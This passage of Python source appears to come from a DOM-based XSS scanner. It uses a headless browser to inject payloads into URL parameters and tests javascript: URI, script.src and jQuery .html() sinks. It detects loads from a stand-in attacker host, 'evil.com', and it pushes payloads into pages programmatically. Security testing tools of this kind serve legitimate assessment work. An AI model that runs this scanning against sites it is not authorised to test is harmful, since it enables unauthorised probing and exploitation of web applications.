        tasks = [
            test_uri_payload(param_name, payload)
            for param_name in parameters
            for payload in self.js_uri_payloads
        ]

        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _execute_javascript_uri_test(
        self, test_url: str, payload: str, param_name: str
    ) -> DOMXSSResult:
        """Execute JavaScript URI test (location.assign, href)"""
        result = DOMXSSResult(
            url=test_url,
            payload=payload,
            trigger_method="parameter",
            execution_context="javascript_uri",
            source=f"URL parameter: {param_name}",
            sink="location.assign/href",
        )

        page = None
        try:
            page = await self._new_page()

            console_logs = []
            error_logs = []
            navigation_occurred = False

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Monitor navigation events
            async def handle_navigation(request):
                if (
                    "javascript:" in request.url.lower()
                    or "alert" in request.url.lower()
                ):
                    console_logs.append(f"navigation: {request.url}")

            page.on("request", handle_navigation)

            # Navigate to page
            await page.goto(
                test_url, timeout=self.timeout * 1000, wait_until="networkidle"
            )

            # Wait for potential navigation
            await page.wait_for_timeout(2000)

            # Check for XSS execution or navigation
            result.vulnerable = (
                self._check_xss_execution(
                    console_logs, error_logs, payload, result.sink
                )
                or navigation_occurred
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 8.5
                try:
                    screenshot_path = f"/tmp/dom_xss_uri_{int(time.time())}.png"
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Error in JavaScript URI test: {e}")
            result.error_logs.append(str(e))
        finally:
            if page:
                await page.close()

        return result

    async def _test_external_script_loads(
        self, url: str, parameters: dict[str, str]
    ) -> list[DOMXSSResult]:
        """Test external script loads (script.src) - PARALLEL"""
        results: list[DOMXSSResult] = []
        found_vulns: set[str] = set()

        async def test_script_payload(
            param_name: str, payload: str
        ) -> Optional[DOMXSSResult]:
            if param_name in found_vulns:
                return None

            self.tests_performed += 1

            try:
                test_url = self._inject_parameter_payload(url, param_name, payload)
                result = await self._execute_external_script_test(
                    test_url, payload, param_name
                )

                if result.vulnerable:
                    logger.warning(f"External script load XSS found in {param_name}")
                    found_vulns.add(param_name)

                return result

            except Exception as e:
                logger.debug(f"Error testing external script payload: {e}")
                return None

        tasks = [
            test_script_payload(param_name, payload)
            for param_name in parameters
            for payload in self.external_script_payloads
        ]

        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _execute_external_script_test(
        self, test_url: str, payload: str, param_name: str
    ) -> DOMXSSResult:
        """Execute external script load test (script.src)"""
        result = DOMXSSResult(
            url=test_url,
            payload=payload,
            trigger_method="parameter",
            execution_context="external_script_load",
            source=f"URL parameter: {param_name}",
            sink="script.src",
        )

        page = None
        try:
            page = await self._new_page()

            console_logs = []
            error_logs = []
            script_requests = []

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Monitor network requests for script loads
            async def handle_request(request):
                if request.resource_type == "script":
                    script_requests.append(request.url)
                    console_logs.append(f"script_request: {request.url}")

            page.on("request", handle_request)

            # Navigate to page
            await page.goto(
                test_url, timeout=self.timeout * 1000, wait_until="networkidle"
            )

            # Wait for potential script loads
            await page.wait_for_timeout(3000)

            # Check for external script requests
            external_script_detected = any(
                "evil.com" in req or "xss" in req.lower() for req in script_requests
            )

            # Also check for XSS execution (script might execute)
            result.vulnerable = (
                self._check_xss_execution(
                    console_logs, error_logs, payload, result.sink
                )
                or external_script_detected
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 8.0
                result.console_logs.extend(
                    [f"external_script: {req}" for req in script_requests]
                )
                try:
                    screenshot_path = f"/tmp/dom_xss_script_{int(time.time())}.png"
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Error in external script test: {e}")
            result.error_logs.append(str(e))
        finally:
            if page:
                await page.close()

        return result

    async def _test_jquery_sinks(
        self, url: str, parameters: dict[str, str]
    ) -> list[DOMXSSResult]:
        """Test jQuery sinks ($.html(), $().html())"""
        results: list[DOMXSSResult] = []

        # First check if jQuery is present
        page = None
        try:
            page = await self._new_page()
            await page.goto(url, timeout=self.timeout * 1000, wait_until="networkidle")

            # Check for jQuery
            has_jquery = await page.evaluate(
                """
                () => {
                    return typeof jQuery !== 'undefined' || typeof $ !== 'undefined';
                }
            """
            )

            if not has_jquery:
                await page.close()
                return results  # No jQuery, skip tests

            await page.close()
        except Exception as e:
            logger.debug(f"Error checking for jQuery: {e}")
            if page:
                await page.close()
            return results

        # jQuery detected, test sinks - PARALLEL
        found_vulns: set[str] = set()

        async def test_jquery_payload(
            param_name: str, payload: str
        ) -> Optional[DOMXSSResult]:
            if param_name in found_vulns:
                return None

            self.tests_performed += 1

            try:
                test_url = self._inject_parameter_payload(url, param_name, payload)
                result = await self._execute_jquery_sink_test(
                    test_url, payload, param_name
                )

                if result.vulnerable:
                    logger.warning(f"jQuery sink XSS found in {param_name}")
                    found_vulns.add(param_name)

                return result

            except Exception as e:
                logger.debug(f"Error testing jQuery sink payload: {e}")
                return None

        tasks = [
            test_jquery_payload(param_name, payload)
            for param_name in parameters
            for payload in self.dom_sink_payloads[:5]
        ]

        task_results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in task_results:
            if isinstance(r, DOMXSSResult):
                results.append(r)

        return results

    async def _execute_jquery_sink_test(
        self, test_url: str, payload: str, param_name: str
    ) -> DOMXSSResult:
        """Execute jQuery sink test ($.html())"""
        result = DOMXSSResult(
            url=test_url,
            payload=payload,
            trigger_method="parameter",
            execution_context="jquery_html",
            source=f"URL parameter: {param_name}",
            sink="jQuery.html()",
        )

        page = None
        try:
            page = await self._new_page()

            console_logs = []
            error_logs = []

            page.on(
                "console", lambda msg: console_logs.append(f"{msg.type}: {msg.text}")
            )
            page.on("pageerror", lambda exc: error_logs.append(str(exc)))

            async def handle_dialog(dlg):
                console_logs.append(f"dialog: {dlg.type} {dlg.message}")
                await dlg.dismiss()

            page.on("dialog", handle_dialog)

            # Navigate to page
            await page.goto(
                test_url, timeout=self.timeout * 1000, wait_until="networkidle"
            )

            # Wait for jQuery to potentially process the payload
            await page.wait_for_timeout(2000)

            # Also try to trigger jQuery sinks programmatically
            await page.evaluate(
                f"""
                (function() {{
                    if (typeof jQuery !== 'undefined' || typeof $ !== 'undefined') {{
                        // Try common jQuery sink patterns
                        var payload = {repr(payload)};
                        try {{
                            $('body').html(payload);
                            $('div').html(payload);
                            jQuery('body').html(payload);
                        }} catch(e) {{
                            console.log('jQuery test error:', e);
                        }}
                    }}
                }})();
            """
            )

            await page.wait_for_timeout(1000)

            # Check for XSS execution
            result.vulnerable = self._check_xss_execution(
                console_logs, error_logs, payload, result.sink
            )
            result.console_logs = console_logs
            result.error_logs = error_logs

            if result.vulnerable:
                result.score = 8.5
                try:
                    screenshot_path = f"/tmp/dom_xss_jquery_{int(time.time())}.png"
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Error in jQuery sink test: {e}")
            result.error_logs.append(str(e))
        finally:
            if page:
                await page.close()

        return result

    def get_statistics(self) -> dict[str, Any]:
        """Get detection statistics"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": self.vulnerabilities_found / max(self.tests_performed, 1),
        }
